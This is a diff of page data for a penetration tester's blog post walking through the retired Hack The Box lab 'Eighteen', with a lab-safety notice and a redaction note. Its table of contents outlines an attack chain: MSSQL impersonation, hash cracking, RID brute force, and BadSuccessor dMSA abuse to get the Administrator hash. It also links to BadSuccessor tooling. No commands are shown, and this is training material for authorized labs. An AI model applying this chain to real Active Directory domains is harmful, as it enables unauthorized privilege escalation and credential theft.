 <li>BadSuccessor research: <a href="https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory" target="_blank" rel="nofollow noopener noreferrer">https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory<span class="sr-only"> opens in a new tab</span></a></li>
 <li>BadSuccessor script: <a href="https://github.com/akamai/BadSuccessor" target="_blank" rel="nofollow noopener noreferrer">https://github.com/akamai/BadSuccessor<span class="sr-only"> opens in a new tab</span></a></li>
 <li>Impacket getST dMSA support: <a href="https://github.com/fortra/impacket" target="_blank" rel="nofollow noopener noreferrer">https://github.com/fortra/impacket<span class="sr-only"> opens in a new tab</span></a></li>
-</ul>a:["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$10"}}]
-b:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-crossfittwo-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: CrossFitTwo Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T15:37:33.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-encoding-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Encoding Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T15:23:59.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
-c:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L11",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
-12:T569,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-eighteen-walkthrough/#article","headline":"Hack The Box: Eighteen Walkthrough","description":"MSSQL impersonation exposes a crackable application hash for a WinRM foothold, then BadSuccessor dMSA abuse turns delegated OU creation rights into the Administrator hash and a privileged shell.","url":"https://cyberkareem.com/writing/hackthebox-eighteen-walkthrough/","datePublished":"2026-06-11T15:31:20.000Z","dateModified":"2026-06-11T15:31:20.000Z","wordCount":2309,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/0e139c2744710c55e1c8cfa3976c33d793be10af/HTB-Eighteen.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-eighteen-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-eighteen-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Eighteen Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-eighteen-walkthrough/"}]}]}d:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$12"}}]
-e:["$","$L13",null,{"children":["$","$14",null,{"name":"Next.MetadataOutlet","children":"$@15"}]}]
-15:null
+</ul>b:["$","div",null,{"className":"article-layout shell","children":[["$","aside",null,{"className":"article-context","aria-label":"Article context","data-motion":"fade","children":[["$","$L10",null,{"headings":[{"id":"summary","label":"Summary"},{"id":"credentials-and-flags-summary","label":"Credentials & Flags Summary"},{"id":"exploit-chain-overview","label":"Exploit Chain Overview"},{"id":"step-1-reconnaissance-nmap","label":"Step 1: Reconnaissance (Nmap)"},{"id":"step-2-mssql-enumeration-and-impersonation","label":"Step 2: MSSQL Enumeration & Impersonation"},{"id":"step-3-hash-extraction-and-cracking","label":"Step 3: Hash Extraction & Cracking"},{"id":"step-4-rid-brute-force-and-user-enumeration","label":"Step 4: RID Brute Force & User Enumeration"},{"id":"step-5-winrm-access-user-flag","label":"Step 5: WinRM Access (User Flag)"},{"id":"step-6-badsuccessor-cve-2025-53779","label":"Step 6: BadSuccessor (CVE-2025-53779)"},{"id":"step-7-chisel-tunnel-for-kerberos","label":"Step 7: Chisel Tunnel for Kerberos"},{"id":"step-8-getst-and-administrator-hash-root-flag","label":"Step 8: getST & Administrator Hash (Root Flag)"},{"id":"key-techniques-and-lessons-learned","label":"Key Techniques & Lessons Learned"},{"id":"tools-used","label":"Tools Used"},{"id":"references","label":"References"}]}],["$","div",null,{"className":"article-provenance","children":[["$","span",null,{"children":"Source"}],[["$","p",null,{"children":"Technical source and supporting notes."}],["$","a",null,{"href":"https://github.com/CyberKareem/OSWE-Prep/blob/0e139c2744710c55e1c8cfa3976c33d793be10af/HTB-Eighteen.md","target":"_blank","rel":"nofollow noopener noreferrer","children":["Immutable source revision",["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","small",null,{"children":["CyberKareem/OSWE-Prep",", commit 0e139c274471",""]}]]]}],["$","div",null,{"className":"article-review-note article-review-lab-safety","children":[["$","span",null,{"children":"Official machine record"}],["$","p",null,{"children":["Eighteen, Windows, Medium",". Retirement verified ","12 Jul 2026","."," ","This walkthrough covers an authorized lab. Use these techniques only on systems you own or are explicitly authorized to test."]}],["$","a",null,{"href":"https://www.hackthebox.com/machines/eighteen","target":"_blank","rel":"nofollow noopener noreferrer","children":["View public machine page ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],[["$","div","source-context-0",{"className":"article-review-note article-review-source-context","children":[["$","span",null,{"children":"Source context"}],["$","p",null,{"children":"Based on Abdullah Kareem's public preparation notes and edited for clarity. Commands and technical claims remain tied to the documented lab and tool versions; this page does not add new solution steps or imply Hack The Box endorsement."}],null]}],["$","div","editorial-correction-1",{"className":"article-review-note article-review-editorial-correction","children":[["$","span",null,{"children":"Reusable artifacts removed"}],["$","p",null,{"children":"19 redacted retired-lab artifact occurrences were replaced with descriptive placeholders while preserving the attack method, including credentials, keys, tickets, hashes, flags, private links, or encoded material."}],null]}]]]}],["$","div",null,{"className":"article-prose","dangerouslySetInnerHTML":{"__html":"$11"}}]]}]
+c:["$","nav",null,{"className":"article-pagination shell","aria-label":"Writing navigation","data-motion":"group","children":[["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-crossfittwo-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"More recent in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: CrossFitTwo Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T15:37:33.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}],["$","$L2",null,{"className":"article-pagination-index","href":"/writing","children":["All ",127," articles"]}],["$","div",null,{"children":["$","$L2",null,{"href":"/writing/hackthebox-encoding-walkthrough","data-motion-surface":"control","children":[["$","span",null,{"data-depth-layer":"meta","children":"Earlier in Hack The Box"}],["$","strong",null,{"data-depth-layer":"title","children":"Hack The Box: Encoding Walkthrough"}],["$","time",null,{"dateTime":"2026-06-11T15:23:59.000Z","data-depth-layer":"meta","children":"11 Jun 2026"}]]}]}]]}]
+d:["$","footer",null,{"className":"site-footer","data-motion":"section","children":[["$","div",null,{"className":"shell footer-main","children":[["$","div",null,{"children":[["$","$L2",null,{"className":"brand footer-brand","href":"/","children":[["$","span",null,{"className":"recon-prism-mark","aria-hidden":"true","children":[["$","span",null,{"className":"recon-prism-edge recon-prism-edge-north"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-west"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-east"}],["$","span",null,{"className":"recon-prism-edge recon-prism-edge-south"}],["$","span",null,{"className":"recon-prism-spine"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-upper"}],["$","span",null,{"className":"recon-prism-fork recon-prism-fork-lower"}],["$","span",null,{"className":"recon-prism-core"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-one"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-two"}],["$","span",null,{"className":"recon-prism-node recon-prism-node-three"}]]}],["$","span",null,{"children":"CyberKareem"}]]}],["$","p",null,{"children":"Abdullah Kareem · Penetration Tester at Ejabi InfoSec · Security Researcher"}]]}],["$","div",null,{"className":"footer-link-groups","children":[["$","nav",null,{"className":"footer-site-nav","aria-label":"Site pages","children":[["$","$L2","About",{"href":"/about","children":"About"}],["$","$L2","Projects",{"href":"/projects","children":"Projects"}],["$","$L2","Research",{"href":"/research","children":"Research"}],["$","$L2","Writing",{"href":"/writing","children":"Writing"}],["$","$L2","Services",{"href":"/services","children":"Services"}],["$","$L2","Contact",{"href":"/contact","children":"Contact"}],["$","$L2","Policies",{"href":"/policies","children":"Policies"}]]}],["$","nav",null,{"className":"social-links","aria-label":"Contact and public profiles","children":[["$","$L2","Business email",{"href":"/contact","children":["Business email"," ",["$","span",null,{"aria-hidden":"true","children":"→"}],["$","span",null,{"className":"sr-only","children":" opens the browser-based contact options"}]]}],["$","a","LinkedIn",{"href":"https://www.linkedin.com/in/cyberkareem/","target":"_blank","rel":"noreferrer","children":["LinkedIn"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","Discord",{"href":"https://discord.com/invite/f6dryR2uGt","target":"_blank","rel":"noreferrer","children":["Discord"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","GitHub",{"href":"https://github.com/CyberKareem","target":"_blank","rel":"noreferrer","children":["GitHub"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}],["$","a","X",{"href":"https://x.com/cyberkareem","target":"_blank","rel":"noreferrer","children":["X"," ",["$","span",null,{"aria-hidden":"true","children":"↗"}],["$","span",null,{"className":"sr-only","children":" opens in a new tab"}]]}]]}],["$","$L12",null,{}]]}]]}],["$","div",null,{"className":"shell footer-bottom","children":[["$","span",null,{"children":"© 2026 Abdullah Kareem"}],["$","span",null,{"children":"Security research · engineering background · clear reporting"}],["$","$L2",null,{"href":"/about#career","children":"View professional background →"}]]}]]}]
+13:T569,{"@context":"https://schema.org","@graph":[{"@type":"BlogPosting","@id":"https://cyberkareem.com/writing/hackthebox-eighteen-walkthrough/#article","headline":"Hack The Box: Eighteen Walkthrough","description":"MSSQL impersonation exposes a crackable application hash for a WinRM foothold, then BadSuccessor dMSA abuse turns delegated OU creation rights into the Administrator hash and a privileged shell.","url":"https://cyberkareem.com/writing/hackthebox-eighteen-walkthrough/","datePublished":"2026-06-11T15:31:20.000Z","dateModified":"2026-06-11T15:31:20.000Z","wordCount":2309,"articleSection":"Hack The Box","isBasedOn":"https://github.com/CyberKareem/OSWE-Prep/blob/0e139c2744710c55e1c8cfa3976c33d793be10af/HTB-Eighteen.md","author":{"@id":"https://cyberkareem.com/#person"},"publisher":{"@id":"https://cyberkareem.com/#person"},"image":"https://cyberkareem.com/social/v2/writing/hackthebox-eighteen-walkthrough.png","mainEntityOfPage":"https://cyberkareem.com/writing/hackthebox-eighteen-walkthrough/"},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://cyberkareem.com/"},{"@type":"ListItem","position":2,"name":"Writing","item":"https://cyberkareem.com/writing/"},{"@type":"ListItem","position":3,"name":"Hack The Box: Eighteen Walkthrough","item":"https://cyberkareem.com/writing/hackthebox-eighteen-walkthrough/"}]}]}e:["$","script",null,{"type":"application/ld+json","dangerouslySetInnerHTML":{"__html":"$13"}}]
+f:["$","$L14",null,{"children":["$","$15",null,{"name":"Next.MetadataOutlet","children":"$@16"}]}]
+16:null
